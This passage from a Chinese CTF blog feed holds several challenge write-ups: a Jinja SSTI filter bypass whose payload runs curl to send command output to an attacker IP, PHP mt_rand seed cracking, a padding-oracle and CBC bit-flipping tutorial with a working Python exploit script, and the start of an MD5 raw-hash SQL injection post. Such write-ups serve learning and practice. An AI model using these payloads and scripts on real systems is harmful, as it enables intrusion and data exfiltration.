&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;考察黑名单过滤逻辑错误，这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即 &lt;code&gt;if=&amp;gt;iconfigf&lt;/code&gt; ，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个 &lt;code&gt;config&lt;/code&gt; 被替换之后，过滤也就结束了。&lt;/p&gt;
&lt;p&gt;那么我们在所有被过滤的关键词中间都可以插入一个config来避开过滤；&lt;/p&gt;
&lt;p&gt;最终playlaod：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__[&#39;linecache&#39;].oconfigs.system(&#39;curl http://174.0.225.32/?a=`ls \|base64`&#39;) %}1{% endiconfigf %}
#相当于把ls的结果进行base64编码后（不然只能显示一行），以curl的方式发送到攻击机
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{a2bc941d-a38d-42bb-97be-fe2440442cdf}&lt;/p&gt;
&lt;h3 id=&#34;枯燥的抽奖httpsbuuojcnchallengesgwctf202019枯燥的抽奖&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[GWCTF%202019]%e6%9e%af%e7%87%a5%e7%9a%84%e6%8a%bd%e5%a5%96&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;枯燥的抽奖&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：PHP逆向脚本、PHP伪随机数爆破&lt;/p&gt;
&lt;p&gt;打开题目，叫你猜数据，并且给了前10位：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170333.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;随便输一个提交，随即给出源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
#这不是抽奖程序的源代码！不许看！
header(&amp;quot;Content-Type: text/html;charset=utf-8&amp;quot;);
session_start();
if(!isset($_SESSION[&#39;seed&#39;])){
$_SESSION[&#39;seed&#39;]=rand(0,999999999);
}

mt_srand($_SESSION[&#39;seed&#39;]);
$str_long1 = &amp;quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;;
$str=&#39;&#39;;
$len1=20;
for ( $i = 0; $i &amp;lt; $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo &amp;quot;&amp;lt;p id=&#39;p1&#39;&amp;gt;&amp;quot;.$str_show.&amp;quot;&amp;lt;/p&amp;gt;&amp;quot;;


if(isset($_POST[&#39;num&#39;])){
    if($_POST[&#39;num&#39;]===$str){x
        echo &amp;quot;&amp;lt;p id=flag&amp;gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&amp;lt;/p&amp;gt;&amp;quot;;
    }
    else{
        echo &amp;quot;&amp;lt;p id=flag&amp;gt;没抽中哦，再试试吧&amp;lt;/p&amp;gt;&amp;quot;;
    }
}
show_source(&amp;quot;check.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;意思大概是：&lt;/p&gt;
&lt;p&gt;一个20次的循环，每次从 &lt;code&gt;$str_long1&lt;/code&gt; 随机取一个字符，拼接成最后的 &lt;code&gt;$str&lt;/code&gt; 。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当 &lt;code&gt;mt_rand()&lt;/code&gt; 函数运行的时候，会检查有没有播种 &lt;code&gt;mt_srand&lt;/code&gt; 如果已经播种了，就直接取随机数，其实这里和C语言一样（PHP底层是C）如果不每次重新播种的话，随机数怎么取都是一样的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们来写段代码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
mt_srand(12345);
echo mt_rand().&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们访问，输出 &lt;code&gt;162946439&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;现在代码改为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
mt_srand(12345); 
echo mt_rand().&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
echo mt_rand().&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
echo mt_rand().&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
echo mt_rand().&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
echo mt_rand().&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们再次访问:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;162946439

247161732

1463094264

1878061366

394962642
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;现在细心的人可能已经发现，第一个数 &lt;code&gt;162946439&lt;/code&gt; 存在猫腻了。&lt;/p&gt;
&lt;p&gt;为什么生成随机数会一样呢？我们多次访问。震惊:
还是&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;162946439

247161732

1463094264

1878061366

394962642
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其实，这就是伪随机数的漏洞，存在可预测性。&lt;/p&gt;
&lt;p&gt;生成伪随机数是线性的，你可以理解为 &lt;code&gt;y=ax&lt;/code&gt; , &lt;code&gt;x&lt;/code&gt; 就是种子，知道种子和一组伪随机数不是就可以推y(伪随机数)了吗
当然，实际上更复杂肯定。&lt;/p&gt;
&lt;p&gt;我知道种子后，可以确定你输出伪随机数的序列。
知道你的随机数序列，可以确定你的种子。&lt;/p&gt;
&lt;p&gt;用到的是爆破，已经有写好的&lt;a class=&#34;link&#34; href=&#34;https://www.openwall.com/php_mt_seed/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;C脚本&lt;/a&gt;了。&lt;/p&gt;
&lt;p&gt;我们的思路就是根据他给出的10为数据，来爆破他的随机数种子，然后在把剩下的随机数输出&lt;/p&gt;
&lt;p&gt;因为是用的php_mt_seed，我们要用他的格式，这是转换成随机数的脚本&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$pass_now = &amp;quot;JAfq968Gqy&amp;quot;;//给出的密钥
$allowable_characters = &#39;
abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;//字母表

$length = strlen($allowable_characters) - 1;

for ($j = 0; $j &amp;lt; strlen($pass_now); $j++) {//遍历密钥
    for ($i = 0; $i &amp;lt; $length; $i++) {//遍历字母表
        if ($pass_now[$j] == $allowable_characters[$i]) {
            echo &amp;quot;$i $i 0 $length &amp;quot;;
            break;
        }
    }
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行，得到&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 34 34 0 61 42 
42 0 61 16 16 0 61 24 24 0 61
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把php_mt_seed下载解压之后，运行命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;make
./php_mt_seed 45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 
34 34 0 61 42 42 0 61 16 16 0 61 24 24 0 61
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以得到他的随机数种子&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170347.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;然后我们直接把他原来的代码拷贝过来，种子替换为我们爆破出来的：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
mt_srand(591614089);
$str_long1 = &amp;quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;;
$str=&#39;&#39;;
$len1=20;
for ( $i = 0; $i &amp;lt; $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 20);
echo $str_show;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行得到一串字符 &lt;code&gt;JAfq968GqyhRKQTHLc8j&lt;/code&gt; ，开头恰巧就是他给的，提交获得flag&lt;/p&gt;
&lt;p&gt;flag{37c86593-2593-4566-b3cd-18081cbe44d0}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Padding Oracle Attack&amp;CBC字节翻转攻击</title>
        <link>https://anthem-whisper.github.io/p/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</link>
        <pubDate>Tue, 21 Apr 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</guid>
        <description>&lt;h3 id=&#34;前言&#34;&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;在西工大举办的NPUCTF2020上面做到一道webcrypto的题，以前从来没接触过密码安全方向，这次正好学一下入个门&lt;/p&gt;
&lt;h3 id=&#34;正文&#34;&gt;&lt;strong&gt;正文&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;参考&lt;/p&gt;
&lt;p&gt;Padding Oracle Attack：&lt;/p&gt;
&lt;p&gt;《白帽子讲web安全》P239&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://skysec.top/2017/12/13/padding-oracle%e5%92%8ccbc%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&amp;raquo;一叶飘零师傅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CBC翻转攻击：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/7f171477a603&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&amp;raquo;某师傅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/include_heqile/article/details/79942993&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&amp;raquo;某某师傅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先来讲一讲CBC模式加密原理：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170001.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先将明文（Plaintext）分组(常见的以16或8字节为一组)，位数不足的使用特殊字符填充。&lt;/li&gt;
&lt;li&gt;生成一个随机的初始化向量(IV)和一个密钥。&lt;/li&gt;
&lt;li&gt;将IV和第一组明文异或（xor运算）。&lt;/li&gt;
&lt;li&gt;用密钥对3中xor后产生的密文加密。&lt;/li&gt;
&lt;li&gt;用4中产生的密文对第二组明文进行xor操作。&lt;/li&gt;
&lt;li&gt;用密钥对5中产生的密文加密。&lt;/li&gt;
&lt;li&gt;重复4-7，到最后一组明文。&lt;/li&gt;
&lt;li&gt;将IV和加密后的密文拼接在一起，得到最终的密文&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;解密过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170010.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先从密文中取出IV，然后对剩下的密文分组（16或8字节为一组）&lt;/li&gt;
&lt;li&gt;使用秘钥解密第一组密文，将解密结果与IV做异或运算，得到明文1&lt;/li&gt;
&lt;li&gt;然后使用秘钥解第二组密文，将解密的结果与上一组密文进行异或运算，得出明文2&lt;/li&gt;
&lt;li&gt;重复2-3，直至所有密文解密完毕&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以上就是CBC模式的加密解密过程，接下来讲两种手段：&lt;/p&gt;
&lt;h4 id=&#34;padding-oracle-attack&#34;&gt;&lt;strong&gt;Padding Oracle Attack&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;直译为 “填充Oracle攻击” ，这里主要关注一下解密过程：&lt;/p&gt;
&lt;p&gt;密文cipher首先进行一系列处理，如图中的Block Cipher Decryption
我们将处理后的值称为 &lt;code&gt;middle&lt;/code&gt; 中间值
然后 &lt;code&gt;middle&lt;/code&gt; 与我们输入的iv进行异或操作
得到的即为明文
但这里有一个规则叫做Padding填充：
因为加密是按照16位一组分组进行的
而如果不足16位，就需要进行填充&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170017.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;有几个空，就要填充几个“几”&lt;/p&gt;
&lt;p&gt;比如明文为admin，那么需要填充的就是 &lt;code&gt;admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&lt;/code&gt; （11个\x0b）&lt;/p&gt;
&lt;p&gt;如果我们输入一个错误的iv，依旧是可以解密的，但是 &lt;code&gt;middle&lt;/code&gt; 和我们输入的iv经过异或后得到的填充值可能出现错误&lt;/p&gt;
&lt;p&gt;比如本来应该是 &lt;code&gt;admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&lt;/code&gt;
而我们错误的得到 &lt;code&gt;admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x3b\x2c&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这样解密程序往往会抛出异常(Padding Error)&lt;/p&gt;
&lt;p&gt;应用在web里的时候，往往是302或是500报错
而正常解密的时候是200
所以这时，我们可以根据服务器的反应来判断我们输入的iv&lt;/p&gt;
&lt;p&gt;看例子：&lt;/p&gt;
&lt;p&gt;我们假设middle中间值为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正确的解密iv应该为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x6d 0x36 0x70 0x76 0x03 0x6e 0x22 0x39
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解密后正确的明文为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;T E S T 0x04 0x04 0x04 0x04
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是关键点在于，我们可以知道iv的值，却不能得到中间值和解密后明文的值
而我们的目标是&lt;strong&gt;只根据我们输入的iv值和服务器的状态去判断出解密后明文的值&lt;/strong&gt;
这里的攻击即叫做 &lt;code&gt;Padding Oracle Attack&lt;/code&gt; 攻击
这时候我们选择进行爆破攻击&lt;/p&gt;
&lt;p&gt;如果我们构造一个iv为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么 &lt;code&gt;middle&lt;/code&gt; 的值和这个iv异或将会得到原封不动的 &lt;code&gt;middle&lt;/code&gt; 的值&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;现在这个解密结果是不对的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170100.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;正确的 &lt;code&gt;padding&lt;/code&gt; 值只可能是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1个字节的padding为0x01&lt;/li&gt;
&lt;li&gt;2个字节的padding为0x02，0x02&lt;/li&gt;
&lt;li&gt;3个字节的padding为0x03，0x03，0x03&lt;/li&gt;
&lt;li&gt;4个字节的padding为0x04，0x04，0x04，0x04&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此我们希望慢慢调整iv的值，并且希望解密后最后一个值为正确的 &lt;code&gt;padding&lt;/code&gt; 比如一个0x01，我们于是遍历最后一位iv：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170112.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;那么最后一位中间密文就是： &lt;code&gt;0x01^0x3C=0x3D&lt;/code&gt; （这个一定成立，看图）,原来的明文就是 &lt;code&gt;0x3D^0x0F=0x32&lt;/code&gt;（中间密文^原来的iv）&lt;/p&gt;
&lt;p&gt;知道了最后一位的中间密文，就可以遍历倒数第二位iv了，这个时候应该为 &lt;code&gt;0x02&lt;/code&gt; 而非 &lt;code&gt;0x01&lt;/code&gt; 了。看图就懂：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170121.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;以此类推，我们可以就能推算所有中间密文，再用 &lt;code&gt;中间密文^原来的iv&lt;/code&gt; 就能算出明文了&lt;/p&gt;
&lt;h4 id=&#34;cbc字节翻转攻击&#34;&gt;&lt;strong&gt;CBC字节翻转攻击&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;有了上面的CBC加密解密过程的基础，这个手段其实很容易理解；&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170128.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;由解密算法可知：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;A=B^C
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由 &lt;code&gt;^&lt;/code&gt; 运算的性质我们可以知道：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;A=B^C、B=A^C、C=A^B
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这是最关键的一点，我们可以推导出三者做异或运算的结果是0&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C=A^B
C^C=A^B^C=0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们修改了B的值，就一定会影响到A&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;B^X^C=A^X
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也就是说，我们只要给B异或了X，A的值也会改变为他之前的值异或X的结果&lt;/p&gt;
&lt;h4 id=&#34;一-道ctf的例子&#34;&gt;&lt;strong&gt;一 道CTF的例子&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;NPUCTF2020_web🐕&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;我摊牌了，就是懒得写前端
&amp;lt;?php 
error_reporting(0);
include(&#39;config.php&#39;);   # $key,********$file1*********
define(&amp;quot;METHOD&amp;quot;, &amp;quot;aes-128-cbc&amp;quot;);  //定义加密方式
define(&amp;quot;SECRET_KEY&amp;quot;, $key);    //定义密钥
define(&amp;quot;IV&amp;quot;,&amp;quot;6666666666666666&amp;quot;);    //定义初始向量 16个6
define(&amp;quot;BR&amp;quot;,&#39;&amp;lt;br&amp;gt;&#39;);
if(!isset($_GET[&#39;source&#39;]))header(&#39;location:./index.php?source=1&#39;);


#var_dump($GLOBALS);   //听说你想看这个？
function aes_encrypt($iv,$data)
{
    echo &amp;quot;--------encrypt---------&amp;quot;.BR;
    echo &#39;IV:&#39;.$iv.BR;
    return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;
}
function aes_decrypt($iv,$data)
{
    return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#39;False&#39;);  #不返回密文，解密成功返回1，解密失败返回False
}
if($_GET[&#39;method&#39;]==&#39;encrypt&#39;)
{
    $iv = IV;
    $data = $file1;    
    echo aes_encrypt($iv,$data);
} else if($_GET[&#39;method&#39;]==&amp;quot;decrypt&amp;quot;)
{
    $iv = @$_POST[&#39;iv&#39;];
    $data = @$_POST[&#39;data&#39;];
    echo aes_decrypt($iv,$data);
}
echo &amp;quot;我摊牌了，就是懒得写前端&amp;quot;.BR;

if($_GET[&#39;source&#39;]==1)highlight_file(__FILE__);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;padding Oracle Attack&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# coding:utf-8
import requests
import base64

# b&#39;\x97.\xda\xb8\xa5P\t\x95\xae\x9b\xf5\xbf\xe2\x8b.&amp;lt;&#39;
CYPHERTEXT = base64.b64decode(&amp;quot;ly7auKVQCZWum/W/4osuPA==&amp;quot;)
# initialization vector
IV = &amp;quot;6666666666666666&amp;quot;
# PKCS7 16个字节为1组
N = 16
# intermediaryValue ^ IV = plainText
inermediaryValue = &amp;quot;&amp;quot;
plainText = &amp;quot;&amp;quot;
# 爆破时不断需要更改的iv
iv = &amp;quot;&amp;quot;
URL = &amp;quot;http://webdog.popscat.top/index.php?method=decrypt&amp;amp;source=1&amp;quot;


def xor(a, b):
    &amp;quot;&amp;quot;&amp;quot;
    用于输出两个字符串对位异或的结果
    &amp;quot;&amp;quot;&amp;quot;
    return &amp;quot;&amp;quot;.join([chr(ord(a[i]) ^ ord(b[i])) for i in range(len(a))])


for step in range(1, N + 1):
    padding = chr(step) * (step - 1)
    print(step,end=&amp;quot;,&amp;quot;)
    for i in range(0, 256):
        print(i)
        &amp;quot;&amp;quot;&amp;quot;
        iv由三部分组成：
            待爆破位置 chr(0)*(N-step) 
            正在爆破位置 chr(i) 
            使 iv[N-step+1:] ^ inermediaryValue = padding 的 xor(padding,inermediaryValue)
        &amp;quot;&amp;quot;&amp;quot;
        iv = chr(0)*(N-step)+chr(i)+xor(padding,inermediaryValue)
        data = {
            &amp;quot;data&amp;quot;: &amp;quot;ly7auKVQCZWum/W/4osuPA==&amp;quot;,
            &amp;quot;iv&amp;quot;: iv
        }
        r = requests.post(URL,data = data)
        if r.text !=&amp;quot;False&amp;quot;:
            inermediaryValue = xor(chr(i),chr(step)) + inermediaryValue
            print(inermediaryValue)
            break
plainText = xor(inermediaryValue,IV)
print(plainText)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行，得到 &lt;code&gt;FlagIsHere.php&lt;/code&gt; 访问之，得到如下源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;F7LMTk/3nKSVUoSQuOS/dA==
&amp;lt;?php 
#error_reporting(0);
include(&#39;config.php&#39;);    //**************$file2********last step!!
define(&amp;quot;METHOD&amp;quot;, &amp;quot;aes-128-cbc&amp;quot;);
define(&amp;quot;SECRET_KEY&amp;quot;, &amp;quot;6666666&amp;quot;);
session_start();

function get_iv(){    //生成随机初始向量IV
    $random_iv=&#39;&#39;;
    for($i=0;$i&amp;lt;16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}

$lalala = &#39;piapiapiapia&#39;;

if(!isset($_SESSION[&#39;Identity&#39;])){
    $_SESSION[&#39;iv&#39;] = get_iv();

    $_SESSION[&#39;Identity&#39;] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[&#39;iv&#39;]));
}
echo base64_encode($_SESSION[&#39;iv&#39;]).&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;

if(isset($_POST[&#39;iv&#39;])){
    $tmp_id = openssl_decrypt(base64_decode($_SESSION[&#39;Identity&#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[&#39;iv&#39;]));
    echo $tmp_id.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
    if($tmp_id ===&#39;weber&#39;)die($file2);
}

highlight_file(__FILE__);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;整理一下已知信息：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;iv=
F7LMTk/3nKSVUoSQuOS/dA==
\x17 \xb2 \xcc \x4e \x4f \xf7 \x9c \xa4 \x95 \x52 \x84 \x90 \xb8 \xe4 \xbf \x74 
加密后：
$Identity=&#39;MLvuYeH07rhiAa5NJ1p75A==&#39;
$Identity=&#39;\x30 \xbb \xee \x61 \xe1 \xf4 \xee \xb8 \x62 \x01 \xae \x4d \x27 \x5a \x7b \xe4 &#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;目的就是传入新的iv对identity进行解密，如果解密结果为&amp;rsquo;weber&amp;rsquo;那么就爽歪歪，这里考察的就是CBC字节翻转攻击&lt;/p&gt;
&lt;p&gt;和Padding Oracle Attack不一样，这里不需要推测中间密文，根据我上面说的&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;B^X^C=A^X
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;本来是 &lt;code&gt;piapiapiapia\x04\x04\x04\x04&lt;/code&gt; 现在我们需要改为 &lt;code&gt;weber\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B&lt;/code&gt; ，就拿第一位来说：&lt;/p&gt;
&lt;p&gt;我们想要把 &lt;code&gt;p&lt;/code&gt; 改为 &lt;code&gt;w&lt;/code&gt; ，那么我就要找出 &lt;code&gt;X&lt;/code&gt; 的值， &lt;code&gt;&#39;p&#39;^X=&#39;w&#39;&lt;/code&gt; 很容易算出 &lt;code&gt;X=&#39;p&#39;^&#39;w&#39;&lt;/code&gt; 那么我们只需要在将B异或一个 &lt;code&gt;(&#39;p&#39;^&#39;w&#39;)&lt;/code&gt; ，就可以达到目的。&lt;/p&gt;
&lt;p&gt;不过当时比赛的时候平台被D了，我是在出题人的学生机上面跑，脚本应该没问题，但是跑不出来，换了正常环境iv又不一样懒得重写，所以用了学长的脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import base64
def bxor(b1, b2): # use xor for bytes
    parts = []
    for b1, b2 in zip(b1, b2):
        parts.append(bytes([b1 ^ b2]))
    return b&#39;&#39;.join(parts)
iv = base64.b64decode(&amp;quot;h34HL5RbMPw8oTaQ+P58nw==&amp;quot;)
text = b&amp;quot;piapiapiapia\x04\x04\x04\x04&amp;quot;
result = b&amp;quot;weber\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&amp;quot;
middle = bxor(iv,text)
iv = bxor(middle,result)
print(base64.b64encode(iv))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;跑出来POST一个iv过去得到一个网址： &lt;code&gt;https://c-t.work/s/034d3b3bf3fb48||verification code:2q2hwm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;好像是有个附件，下载来是一个xxx.class文件考的Java反编译。。。不过百度能搜到，用工具 &lt;code&gt;jd-gui-1.4.0&lt;/code&gt; 一下就跑出来。&lt;/p&gt;
&lt;p&gt;得到数组，就是flag的ASCII码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170140.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;q = [102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 
     95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125]
for i in q:
    print(chr(i), end=&#39;&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{we6_4og_1s_e4syg0ing}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MD5哈希注入</title>
        <link>https://anthem-whisper.github.io/p/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Wed, 15 Apr 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;p&gt;在网上看到一道CTF题目：https://ctf.show/challenges#web9&lt;/p&gt;
&lt;p&gt;打开后扫目录发现robots.txt，里面提示了index.phps，下载，审计，发现MD5哈希注入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    $flag=&amp;quot;&amp;quot;;
    $password=$_POST[&#39;password&#39;];
    if(strlen($password)&amp;gt;10){
      die(&amp;quot;password error&amp;quot;);
    }
    $sql=&amp;quot;select * from user where username =&#39;admin&#39; and password =&#39;&amp;quot;.md5($password,true).&amp;quot;&#39;&amp;quot;;
    $result=mysqli_query($con,$sql);
    if(mysqli_num_rows($result)&amp;gt;0){
        while($row=mysqli_fetch_assoc($result)){
           echo &amp;quot;登陆成功&amp;lt;br&amp;gt;&amp;quot;;
           echo $flag;
        }
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;问题出在第7行&lt;code&gt;md5($password,true)&lt;/code&gt;，密码使用了 md5 以二进制形式加密后进行在数据库中进行查询，若查询到了数据，就返回成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165922.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
